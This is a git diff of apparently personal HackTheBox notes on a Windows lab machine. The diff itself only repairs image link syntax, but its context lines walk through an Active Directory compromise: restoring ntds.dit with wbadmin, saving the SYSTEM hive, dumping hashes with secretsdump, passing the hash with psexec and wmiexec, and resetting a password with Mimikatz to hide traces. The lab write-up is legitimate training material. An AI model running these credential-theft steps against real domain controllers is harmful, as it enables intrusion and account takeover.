@@ -498,56 +498,56 @@ Now trying the wbadmin command AGAIN
 
 `WindowsImageBackup` directory is created on attack box. SUCCESS.
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203655.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110203655.png)
 Use wbadmin to restore a ntds.dit out of our backup and creating a backup of the SYSTEM Registry hive
 
 `echo Y wbadmin start recovery -version:????? -itemtype:file -items:C: windows\ntds\ntds.dit - recoverytarget:C: -notrestoreacl`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203958.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110203958.png)
 
 get versions by running:
 
 `wbadmin get versions`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204110.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110204110.png)
 
 `10/02/2020-03:51`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204208.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110204208.png)
 
 Execute this on evil-winrm
 
 `echo Y wbadmin start recovery -version:10/02/2020-03:51 -itemtype:file -items:C: windows\ntds\ntds.dit - recoverytarget:C: -notrestoreacl`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204324.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110204324.png)
 
 Got `ntds.dit` ! Download it to attack box.
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204408.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110204408.png)
 Save and download the reg keys
 
 `reg save hklm\system system.hive`
 
 `download system.hive`
 
-![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204640.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110204640.png)
 Now we can run #impacket #secretsdump 
 
 (without history)
 `secretsdump.py -ntds ntds.dit -system system.hive LOCAL`
 
-![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205058.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110205058.png)
 
 
 (with history)
 `secretsdump.py -ntds ntds.dit -system system.hive -history LOCAL`
 
-![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205137.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110205137.png)
 We got admin's hash so can use #psexec with this hash.
 
 `psexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b99ee administrator@10.10.10.192`
 
-![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205419.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110205419.png)
 
 Can't grab the flag as SYSTEM user due to EFS (Encrypted File System). Using WMIExec to get a shell as the actual user
 
@@ -559,4 +559,4 @@ wmiexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b
 
 Using Mimikatz to restore the password of Audit2020, so it's like we were never there.
 
-![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205816.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110205816.png)
